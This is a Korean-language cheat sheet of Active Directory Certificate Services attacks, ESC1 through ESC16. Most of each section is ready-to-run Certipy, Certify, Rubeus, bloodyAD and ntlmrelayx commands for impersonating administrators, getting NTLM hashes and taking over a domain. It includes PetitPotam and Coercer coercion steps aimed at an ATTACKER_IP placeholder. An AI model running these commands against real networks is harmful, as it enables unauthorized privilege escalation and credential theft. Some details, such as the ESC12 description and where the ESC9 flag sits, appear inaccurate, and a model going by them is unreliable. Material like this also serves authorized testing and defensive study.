# ADCS 공격

Active Directory Certificate Services(ADCS)는 Windows 환경에서 디지털 인증서를 관리하는 서비스.
잘못된 구성이 있을 경우 권한 상승, 지속성 확보, 도메인 장악 등의 심각한 공격이 가능하다.

---

## 기본 개념

### PKI 구성 요소

- **Certificate Authority (CA)**: 인증서 발급 및 관리 서버
- **Certificate Templates**: 요청 가능한 인증서의 형태를 정의
- **Certificate Store**: 호스트에 저장된 인증서
- **Auto-enrollment**: 도메인 객체에 대한 자동 인증서 등록

### 인증서 기반 인증

AD에서 사용하는 인증 방식 3가지:

1. Kerberos
2. NTLM
3. ADCS (PKINIT)

PKINIT은 인증서를 사용한 Kerberos 인증이다. 유효한 인증서가 있으면 TGT를 요청할 수 있고, 그 과정에서 NTLM 해시를 획득할 수 있다.

### ADCS 존재 확인

```powershell
# PowerShell
net localgroup "Cert Publishers"
```

```bash
# nxc
nxc ldap <dc_ip> -u <user> -p <pass> -M adcs
nxc ldap <dc_ip> -u <user> -H <ntlm_hash> -M adcs
```

---

## 주요 템플릿 속성

| 속성 | 설명 | 취약한 설정 |
|------|------|------------|
| Enrollee Supplies Subject | 요청자가 인증서 주체(Subject)를 직접 지정 가능 | True |
| Requires Manager Approval | 관리자 승인 필요 여부 | False |
| Authorized Signatures Required | 요청 승인에 필요한 서명 수 | 0 |
| Enrollment Rights | 인증서를 요청할 수 있는 사용자/그룹 | Domain Users 포함 |
| EKU (Extended Key Usage) | 인증서 용도 | Client Authentication 포함 |
| Any Purpose | 모든 용도로 사용 가능 | True |

---

## 취약점 탐색

```bash
# Certipy - 취약한 템플릿 탐색
certipy find -vulnerable -u <user> -p '<pass>' -dc-ip <dc_ip> -stdout

# 결과를 파일로 저장
certipy find -vulnerable -u <user> -p '<pass>' -dc-ip <dc_ip> -output result
```

---

## ESC1: 잘못 구성된 인증서 템플릿

**조건:**

- Enrollee Supplies Subject = True (요청자가 Subject 지정 가능)
- Requires Manager Approval = False
- Authorized Signatures Required = 0
- Enrollment Rights에 공격자가 속한 그룹 포함
- EKU에 Client Authentication 포함

공격자가 Administrator 등 고권한 사용자를 Subject로 지정하여 인증서를 요청할 수 있다.

```bash
# 인증서 요청 (SAN에 administrator 지정)
certipy req -u '<user>@<domain>' -p '<pass>' -ca '<ca_name>' \
  -template '<template_name>' -upn 'administrator@<domain>' \
  -target <dc_fqdn> -dc-ip <dc_ip>

# 획득한 인증서로 인증 → NTLM 해시 획득
certipy auth -pfx administrator.pfx -domain <domain>
```

---

## ESC2: Any Purpose EKU

EKU에 Any Purpose(2.5.29.37.0) 또는 SubCA가 설정된 템플릿.

```bash
# 조건: Enrollee Supplies Subject 불필요, EKU = Any Purpose 또는 SubCA
# SubCA 인증서로 직접 인증은 불가하지만, 다른 인증서를 서명하는 데 악용 가능

# 인증서 요청
certipy req -u user@domain -p pass -ca CA-NAME -template TEMPLATE -target DC_IP

# SubCA 인증서가 발급되면 → CA 인증서처럼 사용하여 다른 인증서 발급 가능 (certipy forge)
```

---

## ESC3: Enrollment Agent 템플릿

Enrollment Agent 인증서를 획득한 후, 이를 이용해 다른 사용자 명의의 인증서를 대리 요청하는 기법.

```bash
# Step 1: Enrollment Agent 템플릿으로 인증서 요청
certipy req -u user@domain -p pass -ca CA-NAME -template EnrollmentAgent -target DC_IP

# Step 2: 획득한 agent 인증서로 다른 사용자의 인증서를 대리 요청
certipy req -u user@domain -p pass -ca CA-NAME -template User \
  -on-behalf-of 'DOMAIN\administrator' -pfx enrollment_agent.pfx -target DC_IP

# Step 3: 획득한 인증서로 인증
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC4: 취약한 템플릿 ACL

공격자에게 인증서 템플릿에 대한 쓰기 권한이 있으면 템플릿 설정을 ESC1 조건으로 수정한 뒤 ESC1 공격을 수행한다.

```bash
# 템플릿 설정 변경 (기존 설정 백업)
certipy template -u <user>@<domain> -p '<pass>' \
  -template <template_name> -save-old -dc-ip <dc_ip>

# ESC1 공격 수행 후 원래 설정으로 복원
```

---

## ESC5: 취약한 PKI 객체 ACL

CA 서버, RootCA, NTAuthCertificates 등 PKI 관련 AD 객체에 대한 쓰기 권한이 있는 경우.

```bash
# PKI 관련 AD 객체 ACL 확인
certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable

# 주요 객체:
# CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
#   ├── CN=AIA           (Authority Information Access)
#   ├── CN=CDP           (CRL Distribution Points)
#   ├── CN=Certification Authorities
#   ├── CN=Enrollment Services
#   └── CN=Certificate Templates

# 이 객체들에 WriteDACL/WriteProperty 권한이 있으면
# 템플릿 추가/수정, CA 설정 변경 등이 가능
```

---

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

CA에 이 플래그가 설정되어 있으면 모든 인증서 요청에서 SAN(Subject Alternative Name)을 임의로 지정할 수 있다.

```bash
# 플래그 확인
certutil -config "CA-NAME" -getreg "policy\EditFlags"
# EDITF_ATTRIBUTESUBJECTALTNAME2 – 0x00040000

# 공격: 아무 템플릿으로 SAN에 administrator 지정
certipy req -u user@domain -p pass -ca CA-NAME -template User \
  -upn administrator@domain -target DC_IP

certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC7: 취약한 CA ACL

ManageCA 또는 Manage Certificates 권한을 가진 사용자가 악용 가능.

```bash
# Step 1: ManageCA 권한으로 SubCA 인증서 요청 (자동 거부됨)
certipy req -u user@domain -p pass -ca CA-NAME -template SubCA \
  -upn administrator@domain -target DC_IP
# Request ID 기록 (예: 123)

# Step 2: ManageCA 권한으로 자신에게 Manage Certificates 권한 부여
certipy ca -u user@domain -p pass -ca CA-NAME -target DC_IP \
  -add-officer user

# Step 3: 거부된 요청 승인 (Issue)
certipy ca -u user@domain -p pass -ca CA-NAME -target DC_IP \
  -issue-request 123

# Step 4: 발급된 인증서 다운로드
certipy req -u user@domain -p pass -ca CA-NAME -target DC_IP \
  -retrieve 123

# Step 5: 인증
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC8: NTLM Relay to ADCS HTTP Enrollment

ADCS의 HTTP enrollment endpoint(certsrv)가 NTLM 인증을 사용하는 경우, NTLM relay를 통해 인증서를 요청할 수 있다.

```bash
# Step 1: Web Enrollment endpoint 확인
curl -s http://CA_IP/certsrv/ -I

# Step 2: ntlmrelayx로 ADCS HTTP endpoint에 relay
impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Step 3: Coercion으로 DC의 NTLM 인증 유도
python3 PetitPotam.py ATTACKER_IP DC_IP
# 또는
python3 Coercer.py -u user -p pass -l ATTACKER_IP -t DC_IP

# Step 4: 획득한 인증서(Base64)로 인증
certipy auth -pfx dc.pfx -dc-ip DC_IP
```

!!! tip "EPA (Extended Protection for Authentication)"
    EPA가 활성화되면 relay 불가. `certipy find`의 `Web Enrollment` 섹션에서 EPA 설정 확인.

---

## ESC11: IF_ENFORCEENCRYPTICERTREQUEST

CA의 RPC 인터페이스에 암호화가 적용되지 않은 경우, RPC relay를 통한 공격이 가능하다.

```bash
# RPC relay (ESC8의 RPC 버전)
# certipy relay 사용
certipy relay -ca CA_IP -template DomainController

# Coercion으로 인증 유도
python3 PetitPotam.py ATTACKER_IP DC_IP
```

---

## ESC12: CA Shell Access / DCOM

CA 서버에 대한 셸 접근 권한 또는 DCOM 접근 권한이 있으면, `certutil`이나 DCOM 인터페이스(`ICertRequest`)를 통해 직접 인증서를 발급할 수 있다.

```bash
# CA 서버에 셸 접근이 있는 경우
# certutil로 직접 인증서 발급
certutil -config "CA-SERVER\CA-NAME" -submit request.req

# DCOM을 통한 원격 인증서 발급
# CA 서버의 ICertRequest DCOM 인터페이스 사용
# certipy로 DCOM 기반 인증서 요청
certipy req -u user@domain -p pass -ca CA-NAME \
  -template User -upn administrator@domain -target CA_IP
```

---

## ESC13: Issuance Policy Linked Group

인증서 템플릿에 Issuance Policy가 설정되고, 해당 정책이 OID 그룹에 링크되어 있을 때. 인증서를 발급받으면 해당 그룹의 권한을 획득할 수 있다.

```bash
# certipy로 Issuance Policy 링크 확인
certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable

# 취약 템플릿으로 인증서 요청 → 링크된 그룹 권한 획득
certipy req -u user@domain -p pass -ca CA-NAME \
  -template TEMPLATE -target DC_IP
certipy auth -pfx user.pfx -dc-ip DC_IP
```

---

## ESC14: 약한 Explicit Mapping

인증서 매핑이 altSecurityIdentities 속성에 의존하며, 해당 속성에 대한 쓰기 권한이 있으면 다른 사용자의 매핑을 조작할 수 있다.

```bash
# altSecurityIdentities에 자신의 인증서를 다른 사용자에게 매핑
# GenericWrite on target user 필요

# 1. 현재 매핑 확인
bloodyAD -d domain -u user -p pass --host DC_IP get object target_user --attr altSecurityIdentities

# 2. 공격자 인증서의 매핑을 대상 사용자에 추가
bloodyAD -d domain -u user -p pass --host DC_IP set object target_user \
  altSecurityIdentities -v "X509:<I>DC=local,DC=domain,CN=CA-NAME<S>CN=attacker"

# 3. 인증서로 대상 사용자 인증
certipy auth -pfx attacker.pfx -dc-ip DC_IP -username target_user -domain domain.local
```

---

## Certify (Windows)

Windows 환경에서 ADCS 열거 및 공격을 수행하는 C# 도구.

```powershell
# 취약 템플릿 탐색
Certify.exe find /vulnerable

# 특정 CA 대상 탐색
Certify.exe find /vulnerable /ca:CORP-CA

# ESC1: SAN 지정 인증서 요청
Certify.exe request /ca:CORP-CA /template:VulnTemplate /altname:administrator

# 인증서 변환 (Certify → Rubeus용)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Rubeus로 TGT 요청
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password /ptt
```

---

## ESC9: No Security Extension

인증서에 보안 확장(szOID_NTDS_CA_SECURITY_EXT)이 없을 때, UPN을 변경하여 다른 사용자로 인증서를 요청할 수 있다.

```bash
# 조건: CT_FLAG_NO_SECURITY_EXTENSION (0x80000) 설정된 CA 또는 StrongCertificateBindingEnforcement = 0

# Step 1: 대상 계정의 UPN을 administrator로 변경 (GenericWrite 필요)
certipy account -u user@domain -p pass -user targetuser \
  -upn administrator update -dc-ip DC_IP

# Step 2: 인증서 요청
certipy req -u targetuser@domain -hashes :HASH \
  -ca CA-NAME -template User -target DC_IP

# Step 3: UPN 복원
certipy account -u user@domain -p pass -user targetuser \
  -upn targetuser@domain update -dc-ip DC_IP

# Step 4: 인증
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC10: 약한 인증서 매핑

KB5014754 패치 이전에는 인증서와 계정 간 매핑이 약하여, UPN 변경을 통해 다른 사용자의 인증서를 획득할 수 있었다.

```bash
# 조건: CertificateMappingMethods에 UPN 매핑(0x4) 포함, StrongCertificateBindingEnforcement = 0
# 대상 계정의 UPN을 administrator로 변경
certipy account -u '<user>' -p '<pass>' -user <target> \
  -upn 'administrator' update -dc-ip <dc_ip>

# 인증서 요청 (변경된 UPN으로)
certipy req -u '<target>' -hashes <hash> -dc-ip <dc_ip> \
  -ca '<ca_name>' -template 'User'

# UPN 원래대로 복원 후 인증
certipy auth -pfx administrator.pfx -domain <domain>
```

---

## ESC15: Version 1 템플릿 Application Policies (CVE-2024-49019)

Version 1 인증서 템플릿에서 Application Policy가 제대로 검증되지 않아, 요청 시 EKU를 조작하여 Client Authentication을 추가할 수 있었다. 2024년 11월 패치됨.

```bash
# 패치 전 환경에서: Version 1 템플릿에 EKU 조작하여 인증서 요청
certipy req -u user@domain -p pass -ca CA-NAME \
  -template VulnV1Template -target DC_IP \
  -application-policies "1.3.6.1.5.5.7.3.2"  # Client Authentication OID
```

---

## ESC16: CA Security Extension 제거

CA에서 szOID_NTDS_CA_SECURITY_EXT 보안 확장이 완전히 제거된 경우. ESC9와 유사하지만, CA 레벨에서 보안 확장이 없으므로 모든 템플릿이 취약해진다. StrongCertificateBindingEnforcement 설정과 무관하게 악용 가능.

```bash
# ESC9와 동일한 공격 방식 (UPN 변경 → 인증서 요청 → 인증)
# CA 자체에서 Security Extension이 비활성화되므로 모든 인증서가 영향받음
certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable
# "Certificate Authority" 섹션에서 "szOID_NTDS_CA_SECURITY_EXT" 확인
```

---

## Certipy 주요 명령어

```bash
# 취약 템플릿 탐색
certipy find -vulnerable -u <user> -p '<pass>' -dc-ip <dc_ip> -stdout

# 인증서 요청
certipy req -u '<user>@<domain>' -p '<pass>' -ca '<ca_name>' \
  -template '<template>' -upn '<target_upn>' -target <dc_fqdn>

# pfx로 인증 및 NTLM 해시 획득
certipy auth -pfx <file>.pfx -domain <domain> -dc-ip <dc_ip>

# Shadow Credentials
certipy shadow auto -username <user>@<domain> -password '<pass>' -account <target>

# UPN 변경
certipy account -u '<user>' -p '<pass>' -user <target> -upn '<new_upn>' update

# 템플릿 설정 변경
certipy template -u <user>@<domain> -p '<pass>' -template <name> -save-old
```

---

## ESC 요약

| ESC | 공격 벡터 | 영향 | 상태 |
|-----|-----------|------|------|
| ESC1 | Subject 지정 가능 템플릿 | 권한 상승 | 구성 문제 |
| ESC2 | Any Purpose EKU | 제한적 | 구성 문제 |
| ESC3 | Enrollment Agent | 권한 상승 | 구성 문제 |
| ESC4 | 템플릿 ACL | 권한 상승 | 구성 문제 |
| ESC5 | PKI 객체 ACL | 권한 상승 | 구성 문제 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | 권한 상승 | 구성 문제 |
| ESC7 | CA ACL | 도메인 장악 | 구성 문제 |
| ESC8 | NTLM Relay → HTTP | 권한 상승 | EPA로 완화 |
| ESC9 | Security Extension 미적용 | 지속성 | 구성 문제 |
| ESC10 | 약한 인증서 매핑 | 권한 상승 | KB5014754 |
| ESC11 | RPC 암호화 미적용 | 권한 상승 | 구성 문제 |
| ESC12 | CA 셸/DCOM 접근 | 도메인 장악 | 접근 필요 |
| ESC13 | Issuance Policy 링크 그룹 | 권한 상승 | 구성 문제 |
| ESC14 | 약한 Explicit Mapping | 권한 상승 | 구성 문제 |
| ESC15 | Version 1 템플릿 | 권한 상승 | 패치됨 |
| ESC16 | Security Extension 제거 | 전체 취약 | 활성 위협 |
